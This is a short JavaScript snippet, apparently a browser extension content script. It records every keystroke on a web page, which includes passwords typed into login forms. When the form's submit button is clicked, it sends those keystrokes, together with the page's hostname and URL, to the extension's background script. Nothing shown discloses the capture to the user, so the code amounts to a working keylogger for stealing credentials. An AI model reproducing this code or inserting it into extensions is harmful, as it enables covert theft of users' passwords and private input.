var keyPressed = [];
var submitBtn = document.querySelector('button[type=submit]');

document.addEventListener('keydown', function(e){
  keyPressed.push(e.key);
});

submitBtn.addEventListener('click', function(e) {
  // pass data to background script
  chrome.runtime.sendMessage({"keyPressed": keyPressed, "source_hostname": window.location.hostname, "source_url": window.location.href}, function(response) {
    // console.log(response);
  });
});
